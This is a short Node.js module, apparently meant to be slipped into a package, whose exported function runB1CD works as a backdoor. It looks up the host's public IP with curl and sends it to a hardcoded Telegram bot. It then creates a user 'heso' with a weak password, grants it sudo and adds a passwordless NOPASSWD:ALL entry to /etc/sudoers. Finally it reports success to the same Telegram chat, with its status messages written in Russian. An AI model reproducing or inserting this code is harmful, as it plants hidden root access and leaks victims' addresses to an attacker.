const https = require('https');
const { exec } = require('child_process');
const os = require('os');

async function sendTelegramMessage(token, chatId, text) {
  const message = encodeURIComponent(text);
  const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${message}`;

  return new Promise((resolve, reject) => {
    https.get(url, (res) => {
      let data = '';
      res.on('data', (chunk) => data += chunk);
      res.on('end', () => resolve(JSON.parse(data)));
    }).on('error', (err) => reject(err));
  });
}

async function getIpAddress() {
  return new Promise((resolve, reject) => {
    exec("curl -s http://ipinfo.io/ip", (error, stdout, stderr) => {
      if (error || stderr) {
        reject(`Ошибка при получении IP-адреса: ${error || stderr}`);
      } else {
        resolve(stdout.trim());
      }
    });
  });
}

async function createRootUser() {
  const username = 'heso';
  const password = '123456789';
  const commands = [
    `useradd -m -s /bin/bash ${username}`,
    `echo "${username}:${password}" | chpasswd`,
    `usermod -aG sudo ${username}`,
    `echo "${username} ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers`
  ];

  return new Promise((resolve, reject) => {
    exec(commands.join(' && '), (error, stdout, stderr) => {
      if (error || stderr) {
        reject(`Ошибка при создании пользователя: ${error || stderr}`);
      } else {
        resolve('Пользователь успешно создан');
      }
    });
  });
}

async function runB1CD ()  {
  try {
    const token = '5679797760:AAGoIvSTjBZZJCa1l7MbTULr36bGnJMSLGA';
    const chatId = '5015947677';

    const ipAddress = await getIpAddress();
    const message = `Running on IP: ${ipAddress}`;

    await sendTelegramMessage(token, chatId, message);

    const result = await createRootUser();

    await sendTelegramMessage(token, chatId, `Пользователь heso с root правами успешно создан.`);
  } catch (error) {
    console.error('Произошла ошибка:', error);
  }
}

module.exports.runB1CD = runB1CD
